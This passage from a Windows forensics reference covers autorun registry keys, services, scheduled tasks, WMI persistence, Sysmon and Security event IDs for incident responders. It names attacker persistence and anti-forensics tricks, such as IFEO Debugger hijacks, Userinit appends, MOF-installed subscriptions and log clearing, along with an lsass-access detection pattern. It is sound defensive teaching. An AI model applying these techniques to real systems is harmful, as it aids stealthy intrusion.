- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices` (legacy NT)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce` (legacy)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run`
- WoW64 mirrors: `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run` and `RunOnce`

Per-user:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`
- `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run`
- `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load`

Related (commonly abused):
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` — `Shell`, `Userinit`, `Notify`, `Taskman` values.
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>` — `Debugger` value silently runs an attacker exe whenever the named program launches (the classic "sticky keys" trick uses `IFEO` on `sethc.exe`).
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad` (SSODL)
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` — DLLs loaded into every user32-loading process (largely defanged by Secure Boot but still observed).
- `HKLM\Software\Microsoft\Active Setup\Installed Components\<GUID>` — runs once per user at first logon if the per-user `Version` differs from per-machine.
- `HKCU\Environment\UserInitMprLogonScript`, `HKLM\System\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (Svchost service host DLLs).

**Filesystem ASEPs** (relevant but covered elsewhere):
- Startup folders: per-user `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`; all-users `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`. LNK files here run at logon.
- Scheduled Tasks (§14) — separate top-level artifact.
- Services (§13) — separate top-level artifact.
- WMI subscriptions (§15) — separate top-level artifact.

**What they record:**

A value name and a value data. Run values execute their data as a command at user logon (HKCU) or any user logon / system start (HKLM). RunOnce values execute exactly once and are then deleted (by the loader, after a successful start) — making them transient and frequently missed by snapshot collection.

**Format / encoding:**

Each entry is a `REG_SZ` or `REG_EXPAND_SZ` value containing a command line (often quoted, sometimes with environment-variable expansion). RunOnce supports prefixes — `!` (delete only after successful execution; default), `*` (run even in Safe Mode).

**Retention:**

- Run: persistent until deleted. The key's last-write time tells you when the value set changed (not which value).
- RunOnce: ephemeral by design. Once Explorer reads and executes the value at logon, the value is removed. Recovery requires deleted-cell scanning (regipy, RECmd, RegistryExplorer's deleted-cell view) within the hive bin before the slot is overwritten.

**Parsers (by name only):**
- Sysinternals `Autoruns` / `Autorunsc` (live system; gold standard for coverage)
- Eric Zimmerman's `RECmd` with the SANS Autoruns batch file
- RegRipper plugins: `run`, `runonce`, `winlogon`, `appinitdlls`, `image_file_execution_options`, `activitymon`
- KAPE — many targets cover the Run families

**Canonical forensic insight:**

This is **the registry persistence triage starting point**. If an attacker established persistence and didn't use scheduled tasks, services, or WMI, they almost certainly used one of these. The Run/RunOnce keys are also a popular **redundancy persistence** — even when the primary mechanism is a service or task, attackers add a Run key as backup because operators are slow to clear all locations.

The IFEO `Debugger` value is the single most overloaded persistence-and-evasion vector — it redirects every launch of a named executable to an attacker-controlled one (often used as a sticky-keys attack from the lock screen pre-Windows 8 era, and still seen in 2026 against unattended kiosks).

**Gotchas:**

- **Key last-write only.** Cannot pin the timestamp of an individual value addition — only of any change to the key. Diff against an older VSS hive is the workaround.
- **Wow6432Node reflection** — easy to miss when looking only at the 64-bit view of HKLM.
- **Environment variable obfuscation** — `%COMSPEC% /c <path>`, `%TEMP%\evil.exe` make signature matching harder.
- **Defender's `Run` values** are legitimate; baselining matters.
- **RunOnceEx** supports loading DLLs (the `Depend` subkey lists DLLs to load before the section's command runs) — a known DLL-side-load vector.
- **The "Load" value** in `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load` runs the named program at user logon — historically overlooked because it predates "Run."
- **Userinit** is comma-delimited and tolerates trailing entries — attackers append to it (`userinit.exe,attacker.exe`).
- **Shell value** in Winlogon should be `explorer.exe`; substitutes are high-confidence indicators.
- **Active Setup** runs once per user, not at every logon — easy to miss on a single-logon snapshot.

**Anti-forensics interactions:**

- **Setting and immediately deleting** a Run value during execution (cleanup script). Hive may still hold the deleted cell.
- **Using RunOnce intentionally to be ephemeral** — popular in droppers; after one boot, the value is gone.
- **Embedding the command inside an `rundll32` / `regsvr32` / `mshta` invocation** — the Run value points to a LOLBin, the LOLBin's command line points to an internet location. The actual code never appears on disk.
- **NULL-byte truncation** in value names — historical; mostly patched.

**Cross-corroboration partners:**

- **Prefetch** — confirms the program in the Run/RunOnce value actually executed.
- **Amcache + ShimCache** — execution evidence at boot/logon.
- **Security 4688 / Sysmon 1** — parent-child process tree confirming the launch.
- **VSS hive snapshots** — the addition / deletion event of the Run value.
- **$UsnJrnl** — the registry file write event at the time of the persistence addition (the hive file writes show up coarsely; the value change itself does not).

---

## 13. Services (HKLM\SYSTEM\CurrentControlSet\Services)

**Full name:** Windows Services. Long-running background processes managed by the Service Control Manager (`services.exe`). Configuration lives in the SYSTEM hive; runtime state lives in memory. Services are second only to scheduled tasks as a persistence vector in mature attacker tradecraft.

**Path / location:**
- Registry: `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` (and ControlSet00X copies).
- Driver services live in the same path; they are differentiated by `Type` value.
- Service host binaries: most live in `%SystemRoot%\System32\` and `System32\drivers\`. Many user-mode services are hosted by `svchost.exe -k <group>` and are actually DLLs at `Parameters\ServiceDll`.
- Service event log: System event log (sources `Service Control Manager`, IDs 7000, 7009, 7011, 7034, 7036, 7040, 7045).

**What each service key records:**

- `Type` — service type bitmask: 0x10 (own process), 0x20 (shared process / svchost), 0x110 (interactive), 0x1 (kernel driver), 0x2 (file system driver), 0x8 (recognizer driver), 0x4 (adapter driver).
- `Start` — 0 (boot), 1 (system), 2 (auto), 3 (manual), 4 (disabled). 2 and 3 are by far the most common for malware.
- `ErrorControl` — how SCM reacts to failure.
- `ImagePath` — for own-process / driver services, the binary path (with optional CLI arguments). For svchost DLL services, this is `%SystemRoot%\System32\svchost.exe -k <group>` and the actual code is in `Parameters\ServiceDll`.
- `DisplayName`, `Description` — strings shown in `services.msc`.
- `ObjectName` — the account the service runs as (`LocalSystem`, `NT AUTHORITY\NetworkService`, `NT AUTHORITY\LocalService`, or a named account).
- `Group` — service group ordering, governs boot order with `HKLM\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder`.
- `DependOnService`, `DependOnGroup` — dependency graph.
- `FailureActions` — what SCM does on crash (restart, run a command, reboot).
- `Parameters\` subkey — service-specific configuration. `ServiceDll` here is the load-bearing value for svchost services and the canonical malware-implant pattern.
- `Security` subkey — the service's security descriptor in binary form. Attackers occasionally rewrite this to hide the service from `sc query`.

**Format / encoding:**

Registry keys/values as described in §11. Most values are `REG_SZ` or `REG_DWORD`. The `Security` value is a binary self-relative security descriptor.

**Retention:**

Services persist in the registry indefinitely. Deletion via `sc delete` removes the key and (almost always) deletes the file from disk only if the package manager / installer did so. The service entry in the System event log (7045 — "service was installed") persists per evtx rotation.

**Parsers (by name only):**
- `sc query`, `sc qc`, `sc qfailure` — live system, official.
- Sysinternals `Autoruns` — shows all services with metadata.
- Eric Zimmerman's `RECmd` with the Services batch file.
- RegRipper `services` plugin.
- KAPE Services target.
- For event-side: `EvtxECmd`, Sigma rules targeting 7045.

**Canonical forensic insight:**

Services are the persistence vector you suspect when a SYSTEM-level binary runs at boot with no associated scheduled task. They are the canonical home for:

- Backdoor implants (PsExec installs `PSEXESVC` as a service to run remote commands; Cobalt Strike's `psexec` aggressor module mimics this).
- Driver-based rootkits (signed driver loaded as a `Type=1` service, often called by signed driver abuse — "BYOVD").
- Legitimate software with malicious DLL side-loads.
- Lateral movement footprint — every `sc create \\target` leaves a service key on the remote box.

The **System 7045** event ("a service was installed in the system") is one of the highest-signal triage events. Combined with the service's `ImagePath` and `ServiceDll`, it tells you what code an attacker introduced to run as SYSTEM.

**Gotchas:**

- **svchost services hide the code path.** The `ImagePath` is svchost; the actual code is `Parameters\ServiceDll`. Tools that show only `ImagePath` miss the implant.
- **Renaming a service** changes the key name but the binary may still be the original — and vice versa.
- **Service hijack via Path Quote Vulnerability** — unquoted `ImagePath` with spaces lets an attacker drop `C:\Program.exe` and have it run instead of `C:\Program Files\Vendor\Service.exe`. Old but still found.
- **Phantom DLL hijack** — service references a DLL that doesn't exist; attacker drops a DLL with that name.
- **Security descriptor manipulation** — service rewritten to deny `READ` to non-SYSTEM principals; doesn't hide from offline analysis.
- **The `Triggers` subkey** (Win7+) defines event-triggered start (network change, ETW event, device arrival). Attackers use it for stealthy non-boot persistence.
- **`Service SID Type`** — newer services have an isolated SID; affects token analysis.
- **PendingFileRenameOperations** in `HKLM\System\CurrentControlSet\Control\Session Manager` are not a service mechanism but interact (used to replace service binaries on next boot).

**Anti-forensics interactions:**

- **Adding a service and clearing the System log** — System 7045 is destroyed, but the registry persists.
- **Reusing a legitimate service name** — typosquatting service names (`MSlSAEX`, `IpHlpSvc`) to blend in.
- **Setting `Start=4` (disabled) and triggering on demand** — service exists but never auto-starts; avoids boot-time IR triggers.
- **Modifying `Parameters\ServiceDll`** of an existing benign service — leaves the service name benign while swapping in malicious code. Detection requires hash-based comparison to a baseline.
- **Removing the service after every reboot using a `RunOnce`** to hide between executions.

**Cross-corroboration partners:**

- **System event log 7045, 7036 (state change), 7034 (terminated unexpectedly), 7009 (timed out starting), 7000 (failed to start).**
- **Security 4697** (a service was installed — domain controller / audit-enabled equivalent of 7045).
- **Sysmon 7** (image loaded — confirms which DLL svchost actually loaded for a given service).
- **Sysmon 1 / Security 4688** — process creation for the service binary.
- **Amcache / ShimCache** — corroborate the binary's first-seen and execution.
- **$MFT** — confirms when the ServiceDll / ImagePath file was created on disk.

---

## 14. Scheduled Tasks (C:\Windows\System32\Tasks)

**Full name:** Windows Task Scheduler. The successor to the legacy `at`/`schtasks` mechanism. Tasks are configured both as XML files on disk and as keys in the registry; the on-disk XML is the authoritative form.

**Path / location:**
- XML definitions: `C:\Windows\System32\Tasks\<TaskFolder>\<TaskName>` — no extension, an XML file.
- Registry index: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}` (per-task entry) and `\TaskCache\Tree\<TaskFolder>\<TaskName>` (folder hierarchy).
- Task cache subkeys: `Plain`, `Logon`, `Boot` (lists of GUIDs by trigger type) plus per-task GUID keys holding `Path`, `Hash` (SHA256 of the XML on disk), `Id`, `Index`.
- Legacy `.job` files: `C:\Windows\Tasks\*.job` — XP/2003-era binary format; deprecated but still parsed by legacy investigations.
- Event logs: `Microsoft-Windows-TaskScheduler/Operational.evtx` (very chatty, IDs 100, 102, 106, 107, 110, 140, 141, 200, 201, 325).
- Security log: 4698 (task created), 4699 (deleted), 4700 (enabled), 4701 (disabled), 4702 (updated) — when audit policy enabled.

**What each task records:**

XML attributes include:
- `RegistrationInfo` — Author, Date (when registered, ISO 8601), Description, URI.
- `Triggers` — when the task runs: `BootTrigger`, `LogonTrigger` (optionally per-user), `TimeTrigger`, `CalendarTrigger`, `EventTrigger` (subscription to a windows event log query — extremely abused), `IdleTrigger`, `RegistrationTrigger`, `SessionStateChangeTrigger`.
- `Principals` — what account it runs as (`UserId` or `GroupId`, `LogonType`, `RunLevel`). `HighestAvailable` is essentially "elevated."
- `Settings` — boolean knobs (start when available, restart on failure, allow demand start, hidden, etc.). `Hidden=true` is a yellow flag.
- `Actions` — the command(s) to run. Typically `<Exec>` with `<Command>` and `<Arguments>`. Multiple actions allowed.

**Format / encoding:**

XML, UTF-16 LE encoded on disk (with BOM). The registry `Hash` value is the SHA256 of the XML file — if the XML is modified out-of-band, the hash mismatches and Task Scheduler refuses to load the task (a useful integrity check, and an obstacle for naive attackers).

**Retention:**

- Disk + registry: persistent until deleted.
- Task Scheduler Operational log: rolls; typically 10 MB → covers days to weeks on active systems.
- Security 4698 events: rolls with Security log.
- Even after deletion, the XML may remain in `$MFT` slack and `$LogFile`; the registry key's last-write time records the deletion.

**Parsers (by name only):**
- `schtasks.exe /Query /XML` — live system.
- Eric Zimmerman's `JLECmd` does NOT do tasks; for tasks use `RECmd` (registry) plus simple XML parsing.
- RegRipper `schedtasks` plugin.
- KAPE Scheduled Tasks target.
- For .job files: `jobparser` (Jamie Levy), TZWorks `jbd`.
- For Operational log: `EvtxECmd`, `Chainsaw`.

**Canonical forensic insight:**

Scheduled tasks are the **modern equivalent of cron** and one of the top three persistence vectors in current Mandiant/Crowdstrike/IBM X-Force reports. They are uniquely flexible:

- `EventTrigger` allows persistence keyed to arbitrary event log events — e.g., "run the implant whenever event 4624 (logon) fires for a specific user."
- `RunLevel=HighestAvailable` + `Principal=SYSTEM` gives SYSTEM execution.
- `LogonTrigger` runs at user logon — competing with Run keys.
- Hidden tasks (`Settings\Hidden=true`) are not shown by default in `taskschd.msc` but are fully visible in the XML directory and registry.
- The task can be scheduled into a non-default folder (e.g., `\Microsoft\Windows\WindowsMail\` is a common blending choice) to hide among legitimate Microsoft tasks.

**Gotchas:**

- **XML on disk vs. registry hash desync.** Attackers who edit XML without updating the SHA256 hash break the task; smart ones recompute it. Either way, parsers reading XML must validate against the registry.
- **Default tasks abuse.** Modifying `\Microsoft\Windows\<existing>` tasks rather than creating new ones; the 4698 fires only on creation, not modification. 4702 (update) catches modifications if audit policy includes it.
- **Hidden tasks.** Easy to miss with `taskschd.msc` GUI — always enumerate XML directory directly.
- **Author field is attacker-controlled** and often set to `Microsoft` or a Windows component name; not trustworthy as attribution.
- **Triggers in Task Scheduler XML can have boundary conditions** (StartBoundary, EndBoundary, RandomDelay) — anti-analysis: a task that runs only after a date in the future will appear dormant on imaging.
- **Multiple tasks with the same name** in different folders coexist; tools that key by name without folder produce false matches.
- **Legacy .job format** is no longer Microsoft-default but still loaded if found.
- **Task Scheduler service caches in memory**; a live-system enumeration sees the cache, which may differ from the on-disk XML if the service hasn't reloaded.

**Anti-forensics interactions:**

- **Creating a task, executing once, deleting** — the XML is gone but the event log 4698+4699 pair plus 200/201 (action started/completed) in Operational log catch it. Both logs rotated → only $UsnJrnl / $LogFile evidence.
- **`COM Handler` action type** instead of `Exec` — runs a COM object rather than an exe; less recognizable signature.
- **Storing the payload in `Description` or `Author`** is non-functional but obfuscates intent.
- **Setting `Settings\DeleteExpiredTaskAfter`** to wipe the task automatically.
- **Editing `TaskCache` registry hash to bypass mismatched XML** — possible but requires SYSTEM.
- **Using `at.exe` (legacy)** — still creates Task Scheduler entries on modern Windows; deprecation hasn't fully landed.

**Cross-corroboration partners:**

- **Security 4698 / 4699 / 4702** — creation, deletion, modification.
- **Task Scheduler Operational 106** (registered), **140** (updated), **141** (deleted), **200** (action started), **201** (action completed), **325** (task launched on computer at logon).
- **Sysmon 1 / Security 4688** — child process under `svchost.exe -k netsvcs -p -s Schedule` (or `taskhost.exe` / `taskhostw.exe`) confirms a task action ran.
- **$MFT** on the XML file — when the task was added on disk.
- **Prefetch / Amcache** — confirms execution of the action binary.

---

## 15. WMI Persistence (root\subscription, OBJECTS.DATA)

**Full name:** Windows Management Instrumentation. A management framework built on COM/DCOM with its own schema, query language (WQL), and object repository. WMI persistence uses the **event subscription** mechanism — a filter (WQL query), a consumer (action to take), and a binding linking them.

**Path / location:**
- Repository: `C:\Windows\System32\wbem\Repository\` — files `OBJECTS.DATA`, `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`. OBJECTS.DATA is the BLOB store of every class, instance, and namespace.
- Namespaces of interest: `root\subscription`, `root\default`, `root\cimv2`.
- Event logs: `Microsoft-Windows-WMI-Activity/Operational.evtx` (IDs 5857, 5858, 5859, 5860, 5861).
- Sysmon events 19, 20, 21 (WMI filter, consumer, binding creation).

**What WMI persistence consists of:**

Three objects bound together in `root\subscription`:
1. `__EventFilter` — a named WQL query (`SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE ...`). Fires when the query matches a system event.
2. `__EventConsumer` — one of several action types:
   - `CommandLineEventConsumer` — runs a command.
   - `ActiveScriptEventConsumer` — runs VBScript or JScript inline.
   - `LogFileEventConsumer` — writes a string to a file.
   - `NTEventLogEventConsumer` — writes a custom event log entry.
   - `SMTPEventConsumer` — emails a string.
3. `__FilterToConsumerBinding` — joins a filter to a consumer.

This trio gives **fileless persistence**: the implant code lives inside `OBJECTS.DATA` as a string property of `ActiveScriptEventConsumer`. No file on disk in the conventional sense.

**Format / encoding:**

`OBJECTS.DATA` is a proprietary binary BLOB format; `INDEX.BTR` is a B-tree of object IDs. Joachim Metz's `libwrc` and David Pany's `PyWMIPersistenceFinder` are the de facto reverse-engineering references.

**Retention:**

The repository persists indefinitely. Subscriptions remain registered until explicitly removed. The repository file `OBJECTS.DATA` is rebuilt by WMI on corruption and can be reset (`winmgmt /resetrepository`) — which destroys subscriptions.

**Parsers (by name only):**
- `PyWMIPersistenceFinder` (David Pany, FireEye/Mandiant — Python; targets the three subscription classes).
- `python-cim` (William Ballenthin) — full CIM repository parser.
- `wmi-parser` (Mark Russinovich did not write one — frequently confused with Autoruns' WMI tab).
- Sysinternals `Autoruns` — covers the `root\subscription` subscriptions.
- Eric Zimmerman does NOT have a dedicated WMI tool.
- KAPE WMI Repository target.

**Canonical forensic insight:**

WMI subscription persistence is the **classic fileless implant** vector. APT29 (Cozy Bear), Stuxnet, and a long list of mature threat actors have used it. Once registered, the implant lives in `OBJECTS.DATA`, persists across reboots, runs as SYSTEM (the WMI service host context), and leaves no executable on disk for an antivirus engine to scan in the conventional sense.

Detection is **subscription enumeration**, not file scanning. `Get-WMIObject -Namespace root\subscription -Class __EventFilter` (and the two siblings) returns the three rows. Sysmon 19/20/21 capture creation in real time; the Operational log has 5861 (consumer execution) which is the highest-signal event.

**Gotchas:**

- **Namespace matters.** Most persistence is in `root\subscription` but `root\default` and `root\cimv2` are also valid (cimv2 is unusual but possible). Always enumerate all namespaces.
- **`__EventFilter` queries can be benign** — Windows ships with some default subscriptions. Baselining is essential. `BVTConsumer`, `SCM Event Log Consumer` are default and harmless.
- **The repository may be corrupted** — partial parse results, missing objects.
- **`ScriptingStandardConsumerSetting`** — a permissions check that some attacks abuse to allow non-admin scripts to register.
- **Subscription only runs when its filter fires** — a malformed or never-firing filter is dormant. Look at the filter logic, not just its presence.
- **`__TimerInstruction`** is an older time-based variant.
- **MOF compilation** — attackers compile a MOF file (`mofcomp evil.mof`) to silently install the persistence. The MOF file may be deleted post-install; only the repository carries it after that.
- **Live `Get-WMIObject`** vs. offline `OBJECTS.DATA` parsing: live shows current; offline can show recovered/deleted.
- **CmdletBinding policies** — running PowerShell with constrained language mode breaks some enumeration; analysts may need raw WMI calls.

**Anti-forensics interactions:**

- **Repository reset** (`winmgmt /resetrepository`) destroys all subscriptions and triggers an event in the Operational log. Aggressive cleanup leaves a trail.
- **Subscription deletion after firing** — the consumer can be a script that removes its own binding. Detection requires log capture in real time (Sysmon 19/20/21) or memory.
- **Embedding payload in `__EventFilter` query string** vs. `__EventConsumer` — only the consumer runs; the filter is just a trigger. Some implants hide IOCs in the filter.
- **Provider hijack** — registering a malicious WMI provider DLL; rarer and more complex.

**Cross-corroboration partners:**

- **Sysmon 19** (WmiEventFilter), **20** (WmiEventConsumer), **21** (WmiEventConsumerToFilter) — real-time creation events with full XML.
- **WMI-Activity Operational 5861** — consumer execution.
- **Security 4688 / Sysmon 1** — child process from `WmiPrvSe.exe` confirms script execution.
- **PowerShell 4104** — if the consumer ran a PowerShell command, the script block was logged (if Script Block Logging enabled).
- **$MFT** on `OBJECTS.DATA` — write events when subscriptions are added.

---

## 16. Sysmon (Microsoft-Windows-Sysmon/Operational)

**Full name:** System Monitor. A Sysinternals tool (Mark Russinovich, Thomas Garnier) that installs as a driver + service and writes structured telemetry events to the Windows event log. Not present by default — must be deployed. In its presence, Sysmon is the single richest endpoint telemetry source on Windows short of an EDR agent.

**Path / location:**
- Event log: `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx`.
- Driver: `C:\Windows\system32\drivers\SysmonDrv.sys`.
- Service binary: `C:\Windows\Sysmon.exe` (or `Sysmon64.exe`).
- Configuration: held in the registry at `HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters\` (rules hash, options, schema version) plus, optionally, a source XML config file referenced at install time.

**Events recorded (current schema is 4.90+ in 2026):**
- **Event 1** — ProcessCreate. CommandLine, parent process, image hashes (MD5/SHA1/SHA256/IMPHASH), user, integrity level, terminal session, ParentImage, ParentCommandLine, ParentUser, OriginalFileName.
- **Event 2** — FileCreateTime. A process changed a file's `$STANDARD_INFORMATION` creation time (i.e., timestomping). One of the highest-fidelity timestomp indicators in Windows.
- **Event 3** — NetworkConnect. Initiator process + source/destination IP/port + protocol. NOT all connections — Sysmon samples and filters per config.
- **Event 4** — Sysmon service state change.
- **Event 5** — ProcessTerminate.
- **Event 6** — DriverLoad with signature info (Signed, SignatureStatus, hashes).
- **Event 7** — ImageLoad (DLL load), with signature info and hashes. Heavy volume — usually configured to filter.
- **Event 8** — CreateRemoteThread. A process injected a thread into another. Among the highest-signal indicators of injection.
- **Event 9** — RawAccessRead. A process read a logical volume via raw device handle (`\\.\C:`). Used by hash-dump tools.
- **Event 10** — ProcessAccess. A process opened a handle to another process with specific access rights. `GrantedAccess` of `0x1010` or `0x1410` to `lsass.exe` is the canonical Mimikatz signature.
- **Event 11** — FileCreate. New file written.
- **Event 12 / 13 / 14** — Registry events: object create, value set, key/value rename.
- **Event 15** — FileCreateStreamHash. Alternate data stream creation, with stream hash. Detects ADS-based payload dropping.
- **Event 16** — Sysmon config change.
- **Event 17 / 18** — Pipe created / connected.
- **Event 19 / 20 / 21** — WMI filter / consumer / binding creation (see §15).
- **Event 22** — DNSQuery. The query string and answers — extremely valuable for C2 detection.
- **Event 23** — FileDelete (archived). Sysmon optionally captures the file content to a quarantine directory before processing the delete.
- **Event 24** — Clipboard change.
- **Event 25** — Process tampering (image hollowing / herpaderping detection — Sysmon detects mismatch between on-disk image and in-memory image).
- **Event 26** — FileDeleteDetected (delete without archive).
- **Event 27 / 28 / 29** — File block executable / file block shredding / FileExecutableDetected (newer schemas).
- **Event 255** — Sysmon internal error.

**Format / encoding:**

EVTX. Each event is structured XML with named fields. Sysmon adds canonical fields like `ProcessGuid` (a Sysmon-internal UUID for the process, NOT the Windows PID) — critical for correlation because PIDs reuse but ProcessGuids do not.

**Retention:**

Operational log defaults to 64 MB or so; on busy hosts (especially with verbose configs) it rolls in hours. Operators typically forward Sysmon events to a SIEM where retention is years; on the endpoint itself, expect days at most.

**Parsers (by name only):**
- `EvtxECmd` (Eric Zimmerman) with the Sysmon maps.
- `Chainsaw` (WithSecure) — Sysmon-aware Sigma rule runner.
- `evtx_dump` (Omer Ben-Amram).
- python-evtx (Willi Ballenthin).
- Velociraptor artifacts, KAPE module.
- Splunk / Elastic / Sentinel / QRadar mappings (operational, not forensic).

**Canonical forensic insight:**

Sysmon is the **process telemetry artifact**. Where Security 4688 gives you sparse process creation, Sysmon gives full command line, parent command line, hashes, integrity level, and the ProcessGuid for correlation. Where SRUM gives you hourly aggregates of network usage, Sysmon 3 gives per-connection records. Where Defender gives you a verdict, Sysmon 7 gives you which DLLs every process loaded.

A well-configured Sysmon (typically based on the SwiftOnSecurity or Olaf Hartong config) is the closest thing to an EDR on a budget. Investigations on Sysmon-equipped hosts proceed dramatically faster than on bare Windows.

**Gotchas:**

- **Sysmon is not installed by default.** A clean image has zero Sysmon events. Many enterprise environments don't deploy it.
- **Configuration determines fidelity.** A default Sysmon config logs almost nothing useful. Most fields are tagged with which rule matched (`RuleName`).
- **The Operational log rolls fast** at scale. Without forwarding, hours-old activity may be gone.
- **Event 7 (image load) is very high volume.** Often filtered to known-malicious or specific paths.
- **Sysmon schema versions evolved.** Older logs may lack newer fields; mapping for cross-version analysis is non-trivial.
- **ProcessGuid is per-host.** Cross-host correlation requires combining ProcessGuid with hostname.
- **Sysmon runs in kernel mode** (driver) — it can see what user-mode tools cannot, but is also subject to kernel-level evasion.
- **Original FileName field** comes from the PE Version Info; attackers who recompile binaries control it.
- **Filtered events leave no trace** — if your config excludes connections to local DNS, you cannot retroactively recover them.

**Anti-forensics interactions:**

- **Sysmon driver unload** (`sc stop SysmonDrv` requires SYSTEM; produces Sysmon event 4 — service state change — and System event 7036).
- **Config modification** — Sysmon event 16 records config changes (cannot be evaded from user-mode without unloading the driver).
- **Direct evtx deletion** — Security 1102 fires if Security log; the Sysmon log itself doesn't have a clear-log event, but `wevtutil cl` produces a Sysmon 4? No — clear is captured as `Microsoft-Windows-EventLog` event 104 (audit log was cleared).
- **Driver tampering** — replacing `SysmonDrv.sys` with a benign stub; signature mismatch detectable.
- **PPL bypass** — Sysmon's service can be protected as PPL on newer Windows; older variants killable from user-mode admin.
- **Process Herpaderping / Doppelganging** — Event 25 specifically targets these.

**Cross-corroboration partners:**

- **Security 4688** — same process creation event, less detail.
- **Amcache / ShimCache / Prefetch** — execution corroboration outside Sysmon.
- **Defender event log** — verdicts for binaries Sysmon recorded.
- **PowerShell 4104** — script block content for `powershell.exe` processes Sysmon recorded.
- **DNS Client / DNS server logs** — corroborate Sysmon 22.
- **Firewall log (`pfirewall.log`)** — corroborate Sysmon 3.

---

## 17. Security Event Log

**Full name:** Windows Security Event Log. The audit log. Source channel: `Security`. Most authentication, authorization, privilege, and policy events flow here. The Security log is the canonical source for "who logged in, when, from where."

**Path / location:**
- `%SystemRoot%\System32\winevt\Logs\Security.evtx`.
- Live access via the Event Log service; on-disk access only when service is stopped or via raw read.
- Read access requires the SeSecurityPrivilege right or membership in the Event Log Readers group.

**Events recorded (canonical IDs):**

Authentication / logon:
- **4624** — An account was successfully logged on. Includes `LogonType` (2=interactive, 3=network/SMB, 4=batch, 5=service, 7=unlock, 8=NetworkCleartext, 9=NewCredentials/RunAs, 10=RemoteInteractive/RDP, 11=CachedInteractive), `IpAddress`, `IpPort`, `WorkstationName`, `LogonProcessName`, `AuthenticationPackageName`, `LogonGuid`, `TargetUserSid`, `TargetLogonId`. The single most-pivoted event in IR.
- **4625** — Failed logon. Same fields plus `SubStatus` (e.g., `0xC0000064` user doesn't exist, `0xC000006A` bad password, `0xC0000234` account locked).
- **4634** — Logoff. Same `TargetLogonId` as the matching 4624.
- **4647** — User-initiated logoff (interactive).
- **4648** — A logon was attempted using explicit credentials (RunAs, scheduled task). Detects credential misuse.
- **4672** — Special privileges assigned to new logon (administrator-equivalent).
- **4768 / 4769 / 4770 / 4771** — Kerberos AS-REQ, TGS-REQ, TGS renewed, AS-REQ failed (only on DC).
- **4776** — NTLM authentication (credential validation). Source workstation visible.

Account management:
- **4720** — User account created.
- **4722** — User account enabled.
- **4724** — Password reset attempt.
- **4725** — Account disabled.
- **4726** — Account deleted.
- **4728 / 4732 / 4756** — Member added to security-enabled global / local / universal group.
- **4738** — User account changed.
- **4781** — Account renamed.

Process / object:
- **4688** — A new process has been created. `NewProcessName`, `CommandLine` (only if `Include command line in process creation events` policy enabled — `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled = 1`), `TokenElevationType`, `MandatoryLabel`, `ParentProcessName`.
- **4689** — Process exit.
- **4663** — An attempt was made to access an object. `ObjectName`, `AccessMask`, `ProcessName`. Requires per-object SACL.
- **4656** / **4658** / **4660** / **4670** — handle requested / closed / object deleted / permissions changed (with SACL).
- **4697** — A service was installed in the system (domain-audit equivalent; 7045 in System is the other path).
- **4698 / 4699 / 4700 / 4701 / 4702** — Scheduled task created / deleted / enabled / disabled / updated.

Policy:
- **1102** — The audit log was cleared. Cannot be turned off. The single highest-priority event in an investigation.
- **4719** — System audit policy was changed.
- **4739** — Domain policy was changed.
- **4904 / 4905** — Audit category changes.

Other:
- **5140 / 5145** — Share access / detailed share access.

**Format / encoding:**

EVTX. XML events. Channel: Security. Provider GUID: `{54849625-5478-4994-A5BA-3E3B0328C30D}` (Microsoft-Windows-Security-Auditing).

**Retention:**

Default size: 20 MB on older Windows, 128 MB on Server 2016+. Default behavior: "overwrite events as needed" (oldest first). On a busy DC, the Security log rolls in hours; on a workstation, days to weeks. Critical to forward to SIEM for retention.

**Parsers (by name only):**
- `wevtutil`, `Get-WinEvent` — official.
- `EvtxECmd` (Eric Zimmerman) — produces CSV with maps that expand fields.
- `Chainsaw` — Sigma-rule-based hunting.
- `Hayabusa` — Sigma-based with built-in rule set (formerly Yamato).
- `evtx_dump` (Omer Ben-Amram).
- `python-evtx` (Willi Ballenthin).
- `EvtxParser` (Andreas Schuster, original).

**Canonical forensic insight:**

The Security log is the source of truth for **identity events**: who authenticated, from where, with which mechanism, with what success. The combination of 4624 + 4625 + 4648 + 4672 + 4776 lets you reconstruct lateral movement, credential abuse, and privilege escalation across an enterprise.

The 4688 event, when command-line auditing is enabled, is the cheap-and-dirty alternative to Sysmon 1 — full process creation with command line and parent. Most mature defenders enable it baseline.

The 1102 event is the canary: any clear is recorded with the issuing user. The only way to remove it is to destroy the file (visible in $MFT/$UsnJrnl) or stop the service (visible in System log 7036).

**Gotchas:**

- **LogonType is the key field.** Type 3 alone is meaningless on a workstation but anomalous for non-server roles; Type 10 (RDP) on a Tier-0 admin's workstation is investigation-worthy.
